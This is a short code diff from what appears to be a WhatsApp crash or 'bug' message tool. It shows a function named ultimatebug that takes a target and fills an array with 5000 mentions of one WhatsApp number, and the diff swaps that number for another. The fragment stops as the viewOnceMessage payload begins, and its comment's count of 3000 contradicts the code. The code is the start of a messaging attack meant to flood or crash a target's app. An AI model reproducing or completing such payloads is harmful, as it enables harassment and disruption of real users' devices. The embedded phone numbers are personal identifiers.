@@ -1,6 +1,6 @@
 //FUNCTION XIXIXIXI
 async function ultimatebug(target, ptcp = true) {
-    let mentions = Array(5000).fill("6283871656842@s.whatsapp.net"); // 3000 mention tetap tanpa looping
+    let mentions = Array(5000).fill("6283170966509@s.whatsapp.net"); // 3000 mention tetap tanpa looping
 
     let messagePayload = {
         viewOnceMessage: {
